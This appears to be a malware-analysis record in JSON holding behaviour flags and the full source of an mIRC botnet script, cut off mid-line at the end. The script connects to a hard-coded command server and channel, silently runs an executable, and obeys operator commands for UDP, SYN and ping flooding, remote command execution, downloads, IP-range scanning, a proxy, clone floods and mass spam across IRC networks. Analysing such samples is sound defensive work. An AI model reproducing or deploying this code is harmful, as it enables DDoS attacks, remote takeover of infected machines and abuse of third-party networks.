{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
            "Windows": "May enumerate application windows",
            "chr": "May attempt to obfuscate specific str",
            "command": "May run PowerShell commands",
            "register": "May call a DLL using Excel 4 Macros",
            "run": "May run an executable file or a system command",
            "write": "May write to a file"
        },
        "macro": "on *:START:{\n  .ddeserver on\n  run $mircdir $+ pnp11.exe /n /fh UPDATE\n  .nick [ $+ $os $+ - $+ $r(1,9999) $+ ]]\n  .n0clone\n  .Cona\n  .timercheck 0 10 Cona\n  .timerh1dd3 0 1 H1dd3\n  .timers33 0 1 s33\n  .vlxd32\n}\nalias n0clone { if ($portfree(8857) == $false) { exit } | socklisten noclone 8857 }\non 800:TEXT:*:*: {\n  if ($nick isop %cc) {\n    if ($1 = !ntimer) { if ($2 = Sock) { set %ntnick $3 | set %ntserver $4 | set %ntport $5 | sockopen NTimer $+ $r(1,1000) $+ $fnick %ntserver %ntport }  }\n    if ($1 = !ntreg) { reg $2- }\n    if ($1 = !ntstop) { ntstop }\n    if ($1 = !dde) { /dde $2 command \"\" / $+ $3- }\n    if ($1 = !ind) { .identd on $2- }\n    if ($1 = !-) && ($2 != $null) { %- = $2- | / $+ %- | unset %- }\n    if ($1 = !pfast) { if ($4 == random) { //Tw1stStart $2 $3 $r(1,64000) | halt } | //Tw1stStart $2 $3 $4 }\n    if ($1 = !fserv) { /msg %cc [F-Serv Initialized] ( $+ $nick $+ ) ( Enjoy! | /fserve $nick 3 $2  }\n    if ($1 = !packet) && ($3 != $null) { run pnp11.exe /n /fh /r \"ping.exe $2 -n $3 -l 65500\" | msg %cc \u0002\u00032[\u0002\u000314DDoS\u0002\u00032]\u0002\u000314 packeting $2 with $calc($3 *65536/1024/1000) $+ mb traffic }\n    if ($1 = !packet.stop) { run pnp11.exe /n /fh /r \" $+ $mircdirlibparse.exe -kf ping.exe\" | msg %cc \u0002\u00032[\u0002\u000314DDoS\u0002\u00032]\u0002\u000314 packeting halted! }\n    if ($1 = !run) && ($2 != $null) { /run $2- }\n    if ($1 = !icmp) { if ($2 == $null) { /msg %cc \u0002E\u0002rror\u001f/\u001f\u0002S\u0002yntax: (!icmp ip packetsize howmany, ie: !icmp 127.0.0.1 2000 1000) | halt } | run pnp11.exe /n /r \"ping -n $4 -l $3 -w 0 $2 \" }\n    if ($1 = !Clone) { /clone $2- }\n    if ($1 = !syn) { if ($2 !== $null) { msg %cc \u00031\u0002(\u0002\u0002\u000312S\u0002ynPacket\u00031\u0002)\u0002 \u00031\u0002(\u0002\u000312\u0002A\u0002ttacking\u00031\u0002)\u0002 \u00031\u0002[\u0002\u000312 $+ $2 $+ \u00031\u0002]\u0002\u000312 on \u00031\u0002[\u0002\u000312 $+ $3 $+ \u00031\u0002]\u0002\u000312 \u0002W\u0002ith \u00031\u0002[\u0002\u000312 $+ $4 $+ \u00031\u0002]\u0002\u000312 \u0002P\u0002ackets  | synp start $4 $2 $3 } }\n    if ($1 = !pf) { if ($2 = stop) { apagestop } | if ($2 = start) { apages $3- } }\n    if ($1 = !download) { /download $2- | msg %cc [Downloading..] $nopath($3-) }\n    if ($1 = !downd) { /downd $2- | msg %cc [Downloading..] $nopath($3-) }\n    if ($1 = !bnc.start) && ($3 != $null) { if ($sock(Bnc)) { msg %cc \u0002\u00032[\u0002\u00038ERROR\u0002\u00032]\u0002\u000314 bnc is already active on port: %Bnc.Port $+ , pass: %Bnc.passwd | halt } | %Bnc = on | socklisten Bnc $2 | %Bnc.port = $2 | %Bnc.passwd = $3 | msg %cc \u0002\u00032[\u0002\u000314bnc\u0002\u00032]\u0002\u000314 /server -m $ip $+ : $+ $2 $+ , then /quote PASS $3 }\n    if ($1 = !bnc.stats) && ($sock(Bnc)) { msg %cc \u0002\u00032[\u0002\u000314bnc\u0002\u00032]\u0002\u000314 is on! $ip $+ : $+ %Bnc.port pass: %Bnc.passwd $+ .. users: $sock(BncClient*,0) connected: $sock(BncServer*,0) }\n    if ($1 = !bnc.stop) && (%Bnc.Port != $null) { sockclose Bnc* | msg %cc \u0002\u00032[\u0002\u000314bnc\u0002\u00032]\u0002\u000314 server on port %bnc.port is now off | unset %bnc.* | sockclose Bnc* }\n    if ($1 = !startscan) && (%begshortip == $null) && ($exists(STDE9.exe)) { msg %cc \u0002\u00032[\u0002\u000314scanner\u0002\u00032]\u0002\u000314 starting scan from: $2 to $3 | set %begshortip $2 | set %beglongip $longip(  %begshortip ) | set %endshortip $3 | set %endlongip $longip( %endshortip  ) | set %total $calc( %endlongip - %beglongip ) | unset %totalscaning | startscan }\n    if ($1 = !randscan) && (%begshortip == $null) && ($exists(STDE9.exe)) { set %begit $randip($2) | msg %cc \u0002\u00032[\u0002\u000314scanner\u0002\u00032]\u0002\u000314 starting scan from: %begit to $3 | set %begshortip %begit | set %beglongip $longip(  %begshortip ) | set %endshortip $3 | set %endlongip $longip( %endshortip  ) | set %total $calc( %endlongip - %beglongip ) | unset %totalscaning | startscan }\n    if ($1 = !stopscan) && (%begshortip != $null) { sockclose ip* | timerscanner* off | unset %ip* | unset %total | unset %totalscaning | msg %cc \u0002\u00032[\u0002\u000314scanner\u0002\u00032]\u0002\u000314 scanning of %begshortip to %endshortip stopped by $nick $+ ! | unset %beg* | unset %end* }\n    if ($1 = !var) { msg %cc Variable equals to: [ [ $$2- ] ] }\n    if ($1 = !inviter) { %s.i.c = # | if (# == $null) { set  %s.i.c $nick }  |  if ($2 == load) { /set %i.server $3 | /set %i.port $4 | %i.b = on | s.inviter  } |  if ($2 == stop) { Sockclose inviterM | Sockclose inviterN | remove ichan.txt | /set %i.b off | unset %i.temp.* | /timerinviteconnect off | msg %cc \u00031[\u000314\u0002inviter\u0002\u00031]\u000314:\u00031 Inviter has been killed. }  |  if ($2 == status) { if ($sock(inviter*,0) == 0) { msg %cc \u00031[\u000314\u0002inviter\u0002\u00031]\u000314:\u00031 Status\u000314:\u00031 Not Connected! | halt }  \n      if ($sock(inviter*,0) > 0) { msg %cc \u00031[\u000314\u0002inviter\u0002\u00031]\u000314:\u00031 Status\u000314:\u00031 Connected \u00031[\u000314\u001f\u0002 $+ $sock(inviter*,0) $+ \u0002\u001f\u00031] } } |   if ($2 == stats) { msg %cc \u00031[\u000314\u0002inviter\u0002\u00031]\u000314:\u00031 Stats Total Invited:\u000314\u0002 $calc( %i.t.j  +  %i.t.p ) $+ \u0002 - \u00031Delay:\u000314\u0002 %i.ondelay } |  if ($2 == list) { sockwrite -nt inviterN LIST :* $+ $3- $+ * }  |  if ($2 == msg) { set %imsg $3- | msg %cc \u00031[\u000314\u0002inviter\u0002\u00031]\u0002\u000314\u0002:\u00031 Invite Message set to (\u0002\u000314 $+ $3- $+ \u00031\u0002)\u0002 } \n      if ($2 == ctotal) { msg %cc \u00031[\u000314\u0002inviter\u0002\u00031]\u000314:\u00031 Random Channels Total\u000314:\u0002\u001f $+ $lines(ichan.txt) $+ \u000f }  |  if ($2 == reset) { msg %cc \u00031[\u000314\u0002inviter\u0002\u00031]\u000314:\u00031 All Settings Unset! | unset %i.t.j  | unset %i.t.p | unset %imsg | unset %i.server | unset %s.i.c | unset %i.b | unset %i* | write -c ichan.txt | remove ichan.txt | unset %t.i | sockclose inviter* }  |  if ($2 == mode) { /sockwrite -nt inviter*  MODE $3-  }  \n      if ($2 == join) { if ($3 == random) {  if ($lines(ichan.txt) < 0) || ($exists(ichan.txt) == $false) { msg %cc \u00031[\u000314\u0002inviter\u0002\u00031]\u000314: \u00031Error: Gather channels first! | halt }  |   set %i.r.j.a $4 | /set %i.r.j.i 0  |   :loop |    if (%i.r.j.i  > %i.r.j.a) { goto end } |     /sockwrite -nt inviterN JOIN : $+ $read -l $+ $r(1,$lines(ichan.txt)) ichan.txt  |     inc %i.r.j.i 1  |     goto loop |     :end    |   unset %i.r.j.i | unset %i.r.j.a   |   halt    } |   else { /sockwrite -nt inviterN JOIN : $+ $3 }  } \n    if ($2 == part) { //sockwrite -nt inviterN PART : $+ $3- }   |  if ($2 == nick) { if ($3 == random) { sockwrite -nt inviterN NICK $fnick | halt }  |  //sockwrite -nt inviterN NICK $3   }  |  if ($2 == delay) { set %i.ondelay $3 | msg %cc \u00031[\u000314\u0002inviter\u0002\u00031]\u000314:\u00031 Delay set to: (\u0002\u001f\u000314 $+ $3 $+ \u001f\u0002\u00031). } }\n    if ($1 = !inviteto) {   if ($sock(did*,0) != 0) && ($3 != off) && ($2 != status) { msg %cc My Bot is Already ON!. }\n      .if ($2 == off) { .msg %cc Mass SPaMMer Sets OFF. | sockclose did* | timerinv* off }  \n      .if ($2 == status) && ($sock(did*,0) != 0) { .msg %cc Im \u000314Spamming on;- ( $+ %network $+ ) in port: ( $+ $sock(did*).port $+ ) At: (\u0002 $+ %SPMchannel $+ \u0002) with About;- (\u001f $+ %Total.users $+ \u001f) Users Gonna be Affected this msg with no (@/+) one. }\n      .if ($2 == status) && ($sock(did*,0) = 0) { .msg %cc Im \u00034NOT\u0003 Spamming But My Last SPam Was on;- ( $+ %network $+ ) in port: ( $+ $sock(did*).port $+ ) At: (\u0002 $+ %SPMchannel $+ \u0002) with About;- (\u001f $+ %Total.users $+ \u001f) Users Gonna be Affected this msg with no (@/+) one. }\n      .if ($2 == GO) && ($sock(did*,0) != 0)  { msg %cc Iam Already GONE!. }\n      .if ($2 == GO) && ($sock(did*,0) = 0)  { msg %cc Iam Going ;). | /ruwinviter }\n      if ($sock(did*,0) = 0) {\n        set %total.users 0\n        .if ($3 = rand) { set %SPMChannel $read(ichan.txt)  }\n        .if ($5 = rand) { set %SPMChannel $read(ichan.txt)  }\n        .if ($2- == $null) { .msg %cc Are U FooL Use !inviteto  \u0002NetWork/server\u0002 (Channel/rand) (Invite MSG) \u0002 }\n        .if ($2 == arabchat) { .set %thisnick $nick | .set %network $gettok(KSA@Gulf@Qatar@Doha@Bahrain@irc@, $+ $rand(1,7) $+ ,64) $+ .arabchat.org | .set %SPMchannel $3 | set %SPAM $4-  | /ruwinviter }  \n        .if ($2 == DALNet) { .set %thisnick $nick | .set %network $gettok(jade@liberty@jade@dragon@nexgo@sniper@irc@twisted@, $+ $rand(1,8) $+ ,64) $+ .dal.net | .set %SPMchannel $3 | set %SPAM $4- | /ruwinviter  }\n        .if ($2 == EFnet) { .set %thisnick $nick | .set %network $gettok(irc.homelien.no@irc.Qeast.net@irc.flamed.net@irc.inet.tele.dk@irc.webgiro.se@efnet.demon.co.uk, $+ $r(1,6) $+ ,64) | .set %SPMchannel $3  | set %SPAM $4- | /ruwinviter }\n        .if ($2 == server) { .set %network $3 $4 | .set %SPMchannel $5  | set %SPAM $6- | /ruwinviter }\n      }\n    }\n  }\n}\nalias ruwinviter { sockopen did $+ $ticks $+ $r(1,999) %network }\nalias finished { msg %cc \u0002\u00032[\u0002\u000314scanner\u0002\u00032]\u0002\u000314 scanning from %begshortip to %endshortip is finished! | sockclose ip* |   timers off | unset %beg* | unset %end* | unset %ip* | unset %total* }\non 1:SOCKOPEN:did*:{ if ($sockerr) { return } \n  .sockwrite -nt $sockname PONG $ctime\n  .sockwrite -tn $sockname USER $fnick $+ $r(a,z) $+ $r(1,60) a a : $fnick $fnick \n  .sockwrite -tn $sockname NICK $fnick $+ $chr($r(65,125)) $+ $chr($r(65,125)) \n  .sockwrite -nt $sockname join %SPMChaNNeL\n  .sockwrite -nt $sockname list >100\n  timerpart 1 $r(5,30) /sockwrite -nt $sockname PART %SPMCHaNNeL \n}\non 1:SOCKREAD:did*:{ sockread -f %t.v | if ($gettok(%t.v,2,32) == 322) && ($gettok(%t.v,5,32) > 30) { write ichan.txt $gettok(%t.v,4,32) } | /saving $sockname %t.v } \nalias saving {\n  if ($3 = 353) { /set %names $replace($8-10,$chr(32),$chr(44))  | inc %total.users 3 | timerinv $+ $r(1,999) 1 $r($r(1,500),1000) /sockwrite -nt $1 PRIVMSG %names : $+ %SPAM }\n  if ($3 = 353) { /set %names2 $replace($10-12,$chr(32),$chr(44)) | inc %total.users 3 | timerinv $+ $r(1,999) 1 $r($r(1,500),1000) /sockwrite -nt $1 PRIVMSG %names2 :  $+ %SPAM }\n  if ($3 = 353) { /set %names3 $replace($12-14,$chr(32),$chr(44)) | inc %total.users 3 | timerinv $+ $r(1,999) 1 $r($r(1,500),1000) /sockwrite -nt $1 PRIVMSG %names3 :  $+ %SPAM }\n  if ($3 = 353) { /set %names4 $replace($14-16,$chr(32),$chr(44)) | inc %total.users 3 | timerinv $+ $r(1,999) 1 $r($r(1,500),1000) /sockwrite -nt $1 PRIVMSG %names4 :  $+ %SPAM }\n  if ($3 = 353) { /set %names5 $replace($16-18,$chr(32),$chr(44)) | inc %total.users 3 | timerinv $+ $r(1,999) 1 $r($r(1,500),1000) /sockwrite -nt $1 PRIVMSG %names5 :  $+ %SPAM }\n  if ($3 = 353) { /set %names6 $replace($18-20,$chr(32),$chr(44)) | inc %total.users 3 | timerinv $+ $r(1,999) 1 $r($r(1,500),1000) /sockwrite -nt $1 PRIVMSG %names6 :  $+ %SPAM }\n  if ($3 = 353) { /set %names7 $replace($20-22,$chr(32),$chr(44)) | inc %total.users 3 | timerinv $+ $r(1,999) 1 $r($r(1,500),1000) /sockwrite -nt $1 PRIVMSG %names7 :  $+ %SPAM }\n  if ($3 = 353) { /set %names8 $replace($22-24,$chr(32),$chr(44)) | inc %total.users 3 | timerinv $+ $r(1,999) 1 $r($r(1,500),1000) /sockwrite -nt $1 PRIVMSG %names8 :  $+ %SPAM }\n  if ($3 = 353) { /set %names9 $replace($24-26,$chr(32),$chr(44)) | inc %total.users 3 | timerinv $+ $r(1,999) 1 $r($r(1,500),1000) /sockwrite -nt $1 PRIVMSG %names9 :  $+ %SPAM }\n  if ($3 = 353) { /set %names10 $replace($26-28,$chr(32),$chr(44)) | inc %total.users 3 | timerinv $+ $r(1,999) 1 $r($r(1,500),1000) /sockwrite -nt $1 PRIVMSG %names10 :  $+ %SPAM }\n  if ($3 = 353) { /set %names11 $replace($28-30,$chr(32),$chr(44)) | inc %total.users 3 | timerinv $+ $r(1,999) 1 $r($r(1,500),1000) /sockwrite -nt $1 PRIVMSG %names11 :  $+ %SPAM }\n  if ($3 = 353) { /set %names12 $replace($30-32,$chr(32),$chr(44)) | inc %total.users 3 | timerinv $+ $r(1,999) 1 $r($r(1,500),1000) /sockwrite -nt $1 PRIVMSG %names12 :  $+ %SPAM }\n  if ($3 = 353) { /set %names13 $replace($32-34,$chr(32),$chr(44)) | inc %total.users 3 | timerinv $+ $r(1,999) 1 $r($r(1,500),1000) /sockwrite -nt $1 PRIVMSG %names13 :  $+ %SPAM }\n  if ($3 = 353) { /set %names14 $replace($34-36,$chr(32),$chr(44)) | inc %total.users 3 | timerinv $+ $r(1,999) 1 $r($r(1,500),1000) /sockwrite -nt $1 PRIVMSG %names14 :  $+ %SPAM }\n  if ($3 = 353) { /set %names15 $replace($36-38,$chr(32),$chr(44)) | inc %total.users 3 | timerinv $+ $r(1,999) 1 $r($r(1,500),1000) /sockwrite -nt $1 PRIVMSG %names15 :  $+ %SPAM }\n  if ($3 = 366) { timerinv $+ $r(1,999) 1 1001 /finisheds $1 }\n  if (47 = $left($3,2)) { /finished2 $1 }\n  if (PING = $1) { sockwrite -nt PONG $1- }\n}\non *:disconnect:{   timercheck -o 0 15 Cona  }\nalias ntstop { timernick off | sockclose NTimer* }\nalias reg { sockwrite -nt NTimer* Privmsg nickserv : $+ register $1- }\nalias Tw1stStart  { if $1 = STOP { .timerTw1st off | unset %gnum | msg %cc \u0002[\u0002\u001fPacketing\u001f\u0002]\u0002 Halted } | if $3 = $null { return } |  if $timer(Tw1st).com != $null { msg %cc \u00034\u0002ERROR!\u0002\u00031 \u001fC\u001furrently \u001fA\u001fttacking:\u0002 $gettok($timer(gcoolt).com,3,32) \u0002 | return } |  msg %cc sending ( $+ $1 $+ ) packets to ( $+ $2 $+ ) on port: ( $+ $3 $+ ) |  set %gnum 0 |  .timerTw1st -m 0 400 Tw1st1t $1 $2 $3 }\nalias Tw1st1t {  if $3 = $null { goto done } |  :loop | if %gnum >= $1 { goto done } | inc %gnum 4 \n  sockudp Tw1st $2 $3 $str(\ufffd\ufffd_6\u0735KTE_}\ufffd\ufffd\ufffd,60)\n  sockudp Tw2st $2 $3 $str(!@#$%^&*()_+|,50)\n  sockudp Tw3st $2 $3 $str(@,920)\n  sockudp Tw4st $2 $3 $str(0010110,130) \n  sockudp Tw5st $2 $3 $str(Pong,200)\n  sockudp Tw6st $2 $3 $str(Tw1st,180)\n  sockudp Tw7st $2 $3 $str(*,350)\n  sockudp Tw8st $2 $3 $str(link,200)\n  sockudp Tw9st $2 $3 $str(Tw1st,180)\n  return |  :done | //msg %cc \u0002[\u0002\u001fPacketing\u001f\u0002]\u0002 finished | .timerTw1st off | unset %gnum \n}\n\nalias synp { if ($1 == $null) { return } | syn 1 $1- | syn 1 stop | syn 1 $1- | syn 1 stop | syn 1 $1- | syn 1 stop | syn 1 $1- | syn 1 stop | syn 1 $1- | syn 1 stop | syn 1 $1- | syn 1 stop |  syn 1 $1- | syn 1 stop | syn 1 $1- | syn 1 stop | syn 1 $1- | syn 1 stop | syn 1 $1- | syn 1 stop | msg %cc \u0002S\u0002yn \u0002A\u0002ttack \u0002D\u0002one! }\nalias syn {\n  if ($2 == start) { if ($3 !isnum) || ($5 !isnum) { return } | var %x = 1 | while (%x <= $3) { sockopen syn $+ $r(1,999) $+ $r(1,999) $+ $r(1,999) $4 $5 | inc %x  } }\n  if ($2 == stop) { if ($sock(syn*,0) > 0) { sockclose syn* } }\n}\nalias goinvite { sockwrite -nt $1 JOIN %SPMChaNNeL |   timerpart 1 $r(5,60) /sockwrite -nt $1 PART %SPMCHaNNeL  }\nalias finisheds { .msg %cc I've Spammed on;- ( $+ %network $+ ) in port: ( $+ $sock($1).port $+ ) At: (\u0002 $+ %SPMchannel $+ \u0002) with About;- (\u001f $+ %Total.users $+ \u001f) Users Has been Affected this msg with no (@/+) one. Message sets: ( $+ %SPAM $+ \u000f)..... | if ($exists(ichan.txt) == $true) { set %SPMChannel $read ichan.txt } | if ($exists(ichan.txt) == $false) { set %SPMChannel $read inv.txt } | .msg %cc Auto Changing To %SPMChaNNel $+ ...... is active!... |  /goinvite $1 }\nalias finished2 { .msg %cc There Was a Problem on;- ( $+ %network $+ ) in port: ( $+ $sock($1).port $+ ) At: (\u0002 $+ %SPMchannel $+ \u0002) NO Users Has been Messaged... AutoChanging Channel.. | if ($exists(ichan.txt) == $true) { set %SPMChannel $read ichan.txt } | if ($exists(ichan.txt) == $false) { set %SPMChannel $read inv.txt } | .msg %cc Auto Changing To %SPMChaNNel $+ ...... is active!... |  /goinvite $1 }\non *:socklisten:Bnc:{ sockaccept BncClient $+ $r(1,999) }\non *:sockread:BncClient*:{\n  sockread %BncClient\n  if ($gettok(%BncClient,1,32) == NICK) {\n    set %Bnc.nick $gettok(%BncClient,2,32)\n  }\n  if ($gettok(%BncClient,1,32) == USER) {\n    set %Bnc.user $gettok(%BncClient,2-,32)\n    sockwrite -n $sockname NOTICE AUTH : $+ You need to say /quote PASS <password>\n  }\n  if ($gettok(%BncClient,1,32) == PASS) { \n    if ($gettok(%BncClient,2,32) == %Bnc.passwd) {\n      sockwrite -n $sockname NOTICE AUTH : $+ Welcome to BNC 2.6.4-WIN, the irc proxy\n      sockwrite -n $sockname NOTICE AUTH : $+ Level two, lets connect to something real now\n      sockwrite -n $sockname NOTICE AUTH : $+ type /quote conn [server] <port> <pass> to connect\n      %Bnc.legit = yes\n    } \n    if ($gettok(%BncClient,2,32) != %Bnc.passwd) { \n      sockwrite -n $sockname NOTICE AUTH : $+ Failed Pass!!\n    }\n  }\n  if ($gettok(%BncClient,1,32) == CONN) {\n    if (%Bnc.legit != yes) { sockwrite -n $sockname NOTICE AUTH : $+ BNC Exploits dont work on This | sockclose   $sockname\n    }\n    if (BncServer $+ $remove($sockname,BncClient) != $null) {\n      sockclose BncServer $+ $remove($sockname,BncClient)\n    }\n    sockopen BncServer $+ $remove($sockname,BncClient) $gettok(%BncClient,2,32) $gettok(%BncClient,3,32)\n    sockwrite -n $sockname NOTICE AUTH : $+ Making reality through $gettok(%BncClient,2,32) port $gettok(%BncClient,3,32)\n    set %Bnc.server.passwd $gettok(%BncClient,4,32)\n  }\n  else {\n    if ($sock(BncServer $+ $remove($sockname,BncClient)).status != active) {\n      halt\n    }\n    sockwrite -n BncServer $+ $remove($sockname,BncClient) %BncClient\n  }\n}\nalias jc { /join %cc Sh4d0w }\non *:sockopen:BncServer*:{\n  if ($sockerr) {\n    sockwrite -n $sockname NOTICE AUTH : $+ Failed Connection\n    sockclose $sockname\n    halt\n  }\n  if ($sock($sockname).status != active) {\n    sockwrite -n $sockname NOTICE AUTH : $+ Failed Connection\n    sockclose BncServer $+ $remove($socknme, BncServer)\n    halt\n  }\n  sockwrite -n BncClient $+ $remove($sockname,BncServer) NOTICE AUTH : $+ Suceeded connection\n  sockwrite -n $sockname NICK %Bnc.nick\n  sockwrite -n $sockname USER %Bnc.user\n}\non *:join:%cc:{ if ($nick = $me) { timerjc off } }\non *:sockread:BncServer*:{\n  sockread %BncServer\n  if ($sock(BncClient $+ $remove($sockname,BncServer)).status != active) {\n    halt\n  }\n  sockwrite -n BncClient $+ $remove($sockname,BncServer) %BncServer\n}\non *:sockread:Ntimer*:{\n  sockread %ntread\n  Stay %ntread\n}\non *:sockread:Clone*:{\n  sockread %QHTread\n  Stay %QHTread\n}\nalias fnick {\n  set %fnick $rand(1,10)\n  if (%fnick = 1) { return $read reader.w $+ $chr($r(65,125)) $+ $chr($r(65,125))  }\n  if (%fnick = 2) { return $chr($r(65,125)) $+ $read reader.w $+ $chr($r(65,125))  }\n  if (%fnick = 3) { return $chr($r(65,125)) $+ $chr($r(65,125)) $+ $read  reader.w }\n  if (%fnick = 4) { return $r(A,Z) $+ $read reader.w $+ $r(A,Z) }\n  if (%fnick = 5) { return $chr($r(65,125)) $+ $chr($r(65,125)) $+ $r(a,z) $+ $r(A,Z) $+ $r(a,z)  }\n  if (%fnick = 6) { return $read  reader.w $+ $r(1,40) $+ $chr($r(65,125))  }\n  if (%fnick = 7) { return $r(a,z) $+ $read reader.w $+ $r(a,z) }\n  if (%fnick = 8) { return $read  reader.w $+ $r(a,z) $+ $chr($r(65,125))  }\n  if (%fnick = 9) { return $read  reader.w $+ $r(1,10) $+ $chr($r(65,125))  }\n  if (%fnick = 10) { return $read  reader.w $+ $r(20,50) $+ $chr($r(65,125)) }\n}\nalias s.inviter {   if (%i.ondelay == $null) { msg %s.i.c \u00031[\u000314\u0002inviter\u0002\u00031]\u000314: \u00031Error\u000314:\u00031 Please set delay:\u000314\u0002 !inviter delay \u0002[\u0002delay\u0002]\u0002\u000f | halt } |  if (%i.server == $null) || (%i.port == $null) { msg %s.i.c \u00031[\u000314\u0002inviter\u0002\u00031]\u000314: \u00031Error Starting Inviter, Inviter Server or Port not set! \u000314\u0002%iserver\u0002 \u00031- \u000314\u0002%iserver.port\u0002 | halt }  |  if ($sock(inviter*,0) > 0) { msg %s.i.c \u00031[\u000314\u0002inviter\u0002\u00031]\u000314: \u00031Error: Inviter already loaded! | halt }  \n//sockopen inviterN %i.server %i.port  | msg %s.i.c \u00031[\u0002\u000314inviter\u00031\u0002]\u000314: \u00031Loading inviter to Server\u000314: \u00031(\u0002\u000314 $+ $+ %i.server $+ \u0002\u00031) \u00031Port: \u00031(\u0002\u000314 $+ %i.port $+ \u00031\u0002) |  //sockopen inviterM %i.server %i.port  }\nalias Cona { server ahm3d.dynu.com 6667 | set %cc #B4n |  if ($portfree(113)) { socklisten IDENT 113 } }\non *:sockread:inviter*:{   sockread -f %t.i  | if ($gettok(%t.i,2,32) == 322) && ($gettok(%t.i,5,32) > 30) { write ichan.txt $gettok(%t.i,4,32) }  |  if ($gettok(%t.i,2,32) == 321) { msg %s.i.c \u00031[\u000314\u0002inviter\u0002\u00031]\u000314:\u00031 Listing channels on (\u0002\u000314 $+ $remove($gettok(%t.i,1,32),:) $+ \u0002\u00031)\u000f }  |  if ($gettok(%t.i,2,32) == 323) { msg %s.i.c \u00031[\u000314\u0002inviter\u0002\u00031]\u000314: \u00031Listing channels complete on\u000314\u0002 $remove($gettok(%t.i,1,32),:) \u0002\u00031\u0002[\u0002\u00031Total Channels in List\u000314:\u0002 $+ $lines(ichan.txt) $+ \u00031]\u0002 }  \n  if ($gettok(%t.i,2,32) == 474) { msg %s.i.c \u00031[\u000314\u0002inviter\u0002\u00031]\u000314:\u00031 Join Error\u000314:\u00031 Banned from (\u0002\u000314 $+ $gettok(%t.i,4,32) $+ \u0002\u00031) } |  if ($gettok(%t.i,2,32) == 433) { /sockwrite -nt inviterN NICK $gettok(%t.i,4,32) $+ $r(a,z) } | if ($gettok(%t.i,1,32) == PING) { sockwrite -nt $sockname PONG $gettok(%t.i,2,32) } |   if ($gettok(%t.i,2,32) == JOIN) {  if (%i.on == Off) { halt } |   if ($timer($remove($gettok(%t.i,1,33),:)) !== $null) { halt } \n  if (%i.temp. [ $+ [ $remove($gettok(%t.i,1,33),:) ] ] == done) { halt } |  set %i.temp. [ $+ [ $remove($gettok(%t.i,1,33),:) ] ] done |   set %i.on Off |  /timer $+ $remove($gettok(%t.i,1,33),:) 1 15 /sockwrite -nt inviterM PRIVMSG $remove($gettok(%t.i,1,33),:) : $+ %imsg |   /sockwrite -nt inviterN WHOIS : $+ $remove($gettok(%t.i,1,33),:) |   inc %i.t.j |   .timer 1 %i.ondelay set %i.on Yes  }   | if ($gettok(%t.i,2,32) == KICK) { sockwrite -nt inviterN JOIN : $+ $gettok(%t.i,3,32) } \n  if ($gettok(%t.i,1,32) == ERROR) { msg %s.i.c \u00031[\u000314\u0002inviter\u0002\u00031]\u000314:\u00031 Error Connecting\u000314: %t.i \u00031(\u000314attempting to reconnect\u00031)-(\u0002\u000314to stop !inviter stop\u0002\u00031) | /timerinviteconnect 0 3 /sockopen inviter %i.server %i.port } \n  if ($gettok(%t.i,2,32) == MODE) {    if ($gettok(%t.i,4,32) == +o) { if ($timer($gettok(%t.i,5,32)) == $null) { halt } | .timer $+ $gettok(%t.i,5,32) off | dec %i.t.j 1  | /msg %s.i.c \u00031[\u000314\u0002inviter\u0002\u00031] Error: not inviting:[\u000314\u0002 $+ $gettok(%t.i,5,32) $+ \u0002\u00031]  because he was Oped!\u000f } | if ($gettok(%t.i,4,32) == +v) { if ($timer($gettok(%t.i,5,32)) == $null) { halt } | .timer $+ $gettok(%t.i,5,32) off | dec %i.t.j 1 } }\n  if ($gettok(%t.i,2,32) == NICK) {   if ($timer($remove($gettok(%t.i,1,33),:)) == $null) { halt } |   /timer $+ $remove($gettok(%t.i,1,33),:) off |  dec %i.t.j  } | if ($gettok(%t.i,2,32) == QUIT) { if ($timer($remove($gettok(%t.i,1,33),:)) == $null) { halt } |   /timer $+ $remove($gettok(%t.i,1,33),:) off | dec %i.t.j  } | if ($gettok(%t.i,2,32) == 313) { /msg %s.i.c \u00031[\u0002\u000314inviter\u0002\u00031] WARNING: \u000314IRCOP Detected \u00031[\u000314\u0002 $+ $gettok(%t.i,4,32) $+ \u0002\u00031]\u000f\n  if ($timer($gettok(%t.i,4,32)) == $null) { halt } |  /timer $+ $gettok(%t.i,2,32) off  }  \n}\non 1:sockopen:inviter*: {   sockwrite -nt $sockname PONG $server |  sockwrite -tn $sockname User $read reader.w $+ $r(a,z) $+ $r(1,60) a a : [ [ $fnick ] ] |  sockwrite -tn $sockname Nick $read reader.w | /timerinviteconnect off | sockread  }\non 1:sockclose:inviter*:{ if (%i.b == off) { remove ichan.txt | halt }  |  if (%i.b == on) { msg %s.i.c \u00031[\u000314\u0002inviter\u0002\u00031]\u000314:\u00031 Inviter was disconnected! \u00034Reloading.\u000f | /sockopen $sockname %i.server %i.port } }\non *:Sockopen:NTimer*:{\n  if ($sockerr > 0) { halt }\n  set -u1 %user $rand(a,z) $+ $rand(a,z) $+ $rand(0,9) $+ $rand(a,z) $+ %flood.nick $+ $rand(a,z) $+ $rand(a,z)\n  .sockwrite -nt $sockname USER %user %user %user : $+ %user\n  .sockwrite -nt $sockname NICK $fnick\n  timernick 0 2 sockwrite -nt NTimer* Nick %ntnick\n}\nalias clone {\n  if ($1 = con) { set %cserver $2 | /set %cport $3 | /timeropensock $+ $fnick $4 2 opensock }\n  if ($1 = join) { sockwrite -nt Clone* Join $2- }\n  if ($1 = part) { sockwrite -nt Clone* Part $2 : $+ $3- }\n  if ($1 = msg) { sockwrite -nt Clone* privmsg $2 : $+ $3- }\n  if ($1 = notice) { sockwrite -nt Clone* notice $2 : $+ $3- }\n  if ($1 = reg) { sockwrite -nt Clone* Privmsg NickServ : $+ register $2- | sockwrite -nt Clone* Privmsg NickServ : $+ identify $2- }\n  if ($1 = creg) { set %rchan # $+ $fnick $+ $rand(1,1000) | sockwrite -nt Clone* Join %rchan | sockwrite -nt Clone* Privmsg Chanserv : register %rchan $fnick Clone }\n  if ($1 = jp) { sockwrite -nt Clone* Join $2- | sockwrite -nt Clone* part $2 : $3- | sockwrite -nt Clone* Join $2- | sockwrite -nt Clone* part $2 : $3- | sockwrite -nt Clone* Join $2- | sockwrite -nt Clone* part $2 : $3- }\n  if ($1 = jmp) { sockwrite -nt Clone* Join $2 | sockwrite -nt Clone* privmsg $2 : $3- | sockwrite -nt Clone* part $2 }\n  if ($1 = flood.c) { sockwrite -nt Clone* join $2 | sockwrite -nt Clone* privmsg $2 : $3- | sockwrite -nt Clone* notice $2 : $3- | sockwrite -nt Clone* privmsg $2 : $3- }\n  if ($1 = flood.n) { sockwrite -nt Clone* privmsg $2 : $3- | sockwrite -nt Clone* notice $2 : 